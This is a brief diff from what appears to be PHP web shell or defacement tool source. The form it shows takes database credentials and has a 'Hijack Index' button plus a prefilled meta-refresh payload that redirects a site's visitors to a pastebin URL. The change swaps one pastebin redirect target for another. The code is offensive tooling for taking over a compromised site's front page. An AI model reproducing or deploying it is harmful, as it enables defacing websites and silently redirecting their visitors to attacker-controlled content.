@@ -1150,7 +1150,7 @@ echo
 	<input type='text' value='username_db' name='dbusrrrr'>
 	<input type='text' value='password_db' name='pwddbbn'>
 	<input type='submit' name='up2' value='Hijack Index'><br />
-	<textarea class='area' name='pown' cols='100' rows='7'><meta http-equiv='refresh' content='0;URL=http://pastebin.com/raw/z2vdCWmb'></textarea>
+	<textarea class='area' name='pown' cols='100' rows='7'><meta http-equiv='refresh' content='0;URL=http://pastebin.com/raw/tA2psLv0'></textarea>
 </center>
 </form>";
 
